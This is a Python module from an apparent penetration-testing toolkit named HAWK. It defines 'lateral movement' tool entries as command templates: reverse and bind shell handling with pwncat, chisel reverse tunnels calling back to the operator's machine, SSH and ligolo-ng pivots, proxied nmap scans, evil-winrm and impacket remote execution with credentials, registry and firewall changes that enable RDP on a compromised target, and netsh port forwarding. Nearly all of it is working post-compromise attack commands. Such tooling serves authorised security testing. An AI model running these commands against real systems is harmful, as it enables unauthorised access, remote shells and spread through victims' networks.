# HAWK — Hostile Assessment WorKit
# Copyright 2026 Lorenzo Serafini
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# A copy of the License is provided in the LICENSE file at the root
# of this distribution, or at http://www.apache.org/licenses/LICENSE-2.0
#
# Attribution "Created by Lorenzo Serafini" must be preserved in all
# redistributed and Derivative Works — see NOTICE for details.

"""
HAWK - Phase 7: Lateral Movement
Pivoting, tunneling, network traversal.
"""

from modules.base import BaseModule, Tool


class LateralModule(BaseModule):

    PHASE_ID   = "lateral"
    PHASE_NAME = "LATERAL MOVEMENT"

    TOOLS = [

        # ── 🐧 LINUX / GENERAL ──────────────────────────────────────────────

        Tool(
            id="pwncat",
            name="PWNCAT-CS",
            desc="Advanced reverse/bind shell handler — auto-upload, privesc modules",
            cmd_template="pwncat-cs {target}:{extra}",
            binary="pwncat-cs",
            category="shell",
            os_hint="linux",
        ),
        Tool(
            id="sshuttle",
            name="SSHUTTLE",
            desc="Transparent SSH proxy — route all traffic through a Linux pivot box",
            cmd_template="sshuttle -r {extra}@{target} 0/0 --dns",
            binary="sshuttle",
            category="tunnel",
            os_hint="linux",
        ),
        Tool(
            id="ssh_local_fw",
            name="SSH Local Fwd",
            desc="SSH local port forward — reach internal services through pivot",
            cmd_template="ssh -L 8080:{target}:80 {extra}",
            binary="ssh",
            category="ssh",
            os_hint="linux",
        ),
        Tool(
            id="ssh_dynamic",
            name="SSH Dynamic (SOCKS5)",
            desc="SSH dynamic SOCKS5 proxy on port 1080 — chain with proxychains",
            cmd_template="ssh -D 1080 -f -N {extra}@{target}",
            binary="ssh",
            category="ssh",
            os_hint="linux",
        ),
        Tool(
            id="chisel_server",
            name="CHISEL Server",
            desc="Start chisel reverse tunnel server (port 9000) — run on Kali",
            cmd_template="chisel server --port 9000 --reverse",
            binary="chisel",
            category="tunnel",
            os_hint="any",
        ),
        Tool(
            id="chisel_client",
            name="CHISEL Client (Linux)",
            desc="Chisel reverse tunnel — run on Linux pivot box",
            cmd_template="chisel client {target}:9000 R:socks",
            binary="chisel",
            category="tunnel",
            os_hint="linux",
        ),
        Tool(
            id="proxychains_scan",
            name="PROXYCHAINS NMAP",
            desc=("Route nmap through a SOCKS5 proxy to reach internal networks "
                  "that Kali cannot access directly — used after pivoting onto a "
                  "compromised host.  HOW IT WORKS: proxychains4 intercepts every "
                  "TCP syscall nmap makes and tunnels it through the configured "
                  "SOCKS proxy (set via the PROXY button at the top of HAWK).  "
                  "Traffic exits from the pivot host — not from Kali — providing "
                  "a layer of source anonymisation.  "
                  "PREREQUISITES: (1) a SOCKS5 tunnel running on Kali "
                  "(SSH Dynamic port 1080, chisel R:socks, or ligolo-ng); "
                  "(2) /etc/proxychains4.conf pointing at that tunnel — use "
                  "the PROXY button to configure it.  "
                  "-sT (TCP connect) and -Pn are mandatory: proxychains cannot "
                  "forward raw IP packets or ICMP, only full TCP connections."),
            cmd_template="proxychains4 nmap -sT -Pn {target}",
            binary="proxychains4",
            category="proxy",
            os_hint="any",
        ),
        Tool(
            id="ligolo_download",
            name="LIGOLO-NG (download)",
            desc="Download ligolo-ng proxy + agent — modern alternative to chisel",
            cmd_template=(
                "curl -L https://github.com/nicocha30/ligolo-ng/"
                "releases/latest/download/proxy_linux_amd64 -o ligolo-proxy && chmod +x ligolo-proxy && "
                "curl -L https://github.com/nicocha30/ligolo-ng/"
                "releases/latest/download/agent_linux_amd64 -o ligolo-agent && chmod +x ligolo-agent"
            ),
            binary="curl",
            category="tunnel",
            os_hint="linux",
        ),
        Tool(
            id="ligolo_proxy",
            name="LIGOLO-NG Proxy",
            desc="Start ligolo-ng proxy listener — selfcert, port 11601",
            cmd_template="sudo ./ligolo-proxy -selfcert -laddr 0.0.0.0:11601",
            binary="ligolo-proxy",
            category="tunnel",
            requires_sudo=True,
            os_hint="linux",
        ),

        # ── 🪟 WINDOWS ──────────────────────────────────────────────────────

        Tool(
            id="evil_winrm",
            name="EVIL-WINRM",
            desc="WinRM shell on port 5985 — interactive PowerShell with upload/download",
            cmd_template="evil-winrm -i {target} -u {user} -p {password}",
            binary="evil-winrm",
            category="shell",
            os_hint="windows",
        ),
        Tool(
            id="impacket_wmiexec",
            name="WMIEXEC",
            desc=("Remote command execution via Windows Management Instrumentation "
                  "(WMI) — no service install, leaves a smaller footprint than "
                  "psexec.  Connects on port 135 (RPC) + dynamic high ports, "
                  "authenticates via NTLM, spawns a process via Win32_Process.Create() "
                  "and reads output through ADMIN$ (SMB).  "
                  "⚠ REQUIRES LOCAL ADMIN: WMI remote access and ADMIN$ share are "
                  "restricted to local administrators by default.  Authenticating as "
                  "a normal domain user will produce ACCESS_DENIED or total silence — "
                  "you MUST use Administrator or a local admin account (cleartext "
                  "password or NTLM hash)."),
            cmd_template="impacket-wmiexec {user}:{password}@{target}",
            binary="impacket-wmiexec",
            category="shell",
            os_hint="windows",
        ),
        Tool(
            id="impacket_atexec",
            name="ATEXEC",
            desc=("Single-command remote execution via the Windows Task Scheduler "
                  "service (port 445 / SMB + ITaskSchedulerService RPC).  Creates a "
                  "scheduled task, runs the command immediately, captures the output "
                  "and deletes the task.  Useful when psexec/wmiexec are blocked by "
                  "endpoint controls but the scheduler service is still reachable.  "
                  "⚠ REQUIRES LOCAL ADMIN: the Task Scheduler RPC interface requires "
                  "administrator privileges on the target to register tasks remotely.  "
                  "A normal domain user will get ACCESS_DENIED with no further output — "
                  "use Administrator or a local admin (cleartext or NTLM hash)."),
            cmd_template='impacket-atexec {user}:{password}@{target} "{extra}"',
            binary="impacket-atexec",
            category="shell",
            os_hint="windows",
        ),
        Tool(
            id="rdp_connect",
            name="RDP Connect",
            desc="Connect via RDP — requires credentials or pass-the-hash",
            cmd_template="xfreerdp3 /v:{target} /u:{user} /p:{password} /cert:ignore /tls:seclevel:0 /dynamic-resolution",
            binary="xfreerdp3",
            category="shell",
            os_hint="windows",
        ),
        Tool(
            id="rdp_enable",
            name="RDP Enable (via shell)",
            desc="Enable RDP on target from existing shell — run this ON the target",
            cmd_template=(
                'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" '
                '/v fDenyTSConnections /t REG_DWORD /d 0 /f & '
                'netsh advfirewall firewall set rule group="Remote Desktop" new enable=Yes'
            ),
            binary="reg",
            category="shell",
            os_hint="windows",
            runs_on_target=True,
        ),
        Tool(
            id="chisel_win_download",
            name="Chisel (Windows, download)",
            desc=("Download chisel.exe for Windows to Kali, then transfer it to "
                  "the target and run it to connect back to the chisel server.  "
                  "Chisel release filenames include the version number so the URL "
                  "is resolved dynamically via the GitHub API."),
            cmd_template=(
                "VER=$(curl -s https://api.github.com/repos/jpillora/chisel/"
                "releases/latest | grep -o '\"tag_name\":\"[^\"]*\"' | grep -o 'v[^\"]*') "
                "&& curl -L \"https://github.com/jpillora/chisel/releases/download/"
                "${VER}/chisel_${VER#v}_windows_amd64.gz\" "
                "-o chisel.gz && gunzip chisel.gz && mv chisel chisel.exe"
            ),
            binary="curl",
            category="tunnel",
            os_hint="windows",
        ),
        Tool(
            id="netsh_portfwd",
            name="Netsh Port Forward",
            desc=("Windows built-in TCP port proxy — once inside the target shell "
                  "(meterpreter, evil-winrm, psexec), create a relay that forwards "
                  "any connection arriving on a target port to an internal host:port "
                  "that Kali cannot reach directly.  "
                  "Schema:  Kali → target:LISTEN_PORT → internal_host:CONNECT_PORT.  "
                  "No extra binaries needed — netsh is a Windows built-in.  "
                  "HAWK will ask for listen port, internal IP and connect port "
                  "before generating the command."),
            cmd_template=(
                "netsh interface portproxy add v4tov4 "
                "listenaddress=0.0.0.0 listenport=<LISTEN_PORT> "
                "connectaddress=<CONNECT_ADDRESS> connectport=<CONNECT_PORT>"
            ),
            binary="netsh",
            category="tunnel",
            os_hint="windows",
            runs_on_target=True,
        ),
    ]
